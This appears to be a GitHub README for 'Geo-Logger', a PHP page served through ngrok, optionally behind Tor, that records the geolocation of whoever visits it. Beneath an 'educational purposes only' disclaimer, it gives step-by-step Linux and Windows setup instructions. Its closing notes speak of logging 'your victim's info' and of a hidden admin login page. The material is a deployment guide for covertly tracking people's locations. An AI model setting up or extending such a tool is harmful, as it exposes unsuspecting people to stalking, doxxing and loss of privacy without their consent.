# Geo-Logger

No database. No data breach problem

# Disclaimer
- This thing is for educational purposes only and shall not be used to log and expose someone's home address.
- I will not be responsible for any damage it cause.

## How to use
- Make sure you have ngrok installed in your computer. If you have [Python](https://python.org/) installed in your computer, you can just type `pip install pyngrok` in your command line to install and use it easier which I recommend if you want to read and follow the commands below.
- Learn port forwarding with ngrok [here](https://ngrok.com/docs)

## Port forwarding with Linux
### Commands
NOTE: To be able to use **ngrok**, you'll have to sign up at [here](https://ngrok.com/) and get your own API key.
1. `git clone https://github.com/lilmond/Geo-Logger.git`
2. `cd Geo-Logger/`
3. `php -S localhost:8080 -t public/`
4. `ngrok authtoken yourapikey`
5. `ngrok http 8080` or `proxychains ngrok http 8080` or `torify ngrok http 8080`. Depends if you want to host it behind Tor. Also, set the port number to what you're currently using.

## Port forwarding with ngrok in Windows
### Requirements
- Local web server hosting such as [XAMPP](https://www.apachefriends.org/download.html)
- ngrok
### Procedures
Make sure you have **ngrok** and **XAMPP** or any other local web server hosting already installed.
1. Download my contents [here](https://github.com/lilmond/Geo-Logger/archive/refs/heads/main.zip)
2. Unzip it then copy and paste it in XAMPP's web hosting directory (If you use XAMPP).
3. Initialize your local web hosting service.
4. Sign up at [ngrok]("https://ngrok.com/") to get your API key.
5. Go to ngrok's directory where you downloaded it.
6. Type `ngrok.exe authtoken yourapikey` in your command line
7. Now the final step, type `ngrok http 8080` or whatever port number you're using.

## Extra notes
- Login for configuration settings at public/sasdaw_wasdasdas_config_login.php.
- You can change your password at public/sasdaw_wasdasdas_authenticate.php in line 17 to whatever you want.
- It also logs your victim's info in a text file for your own security.
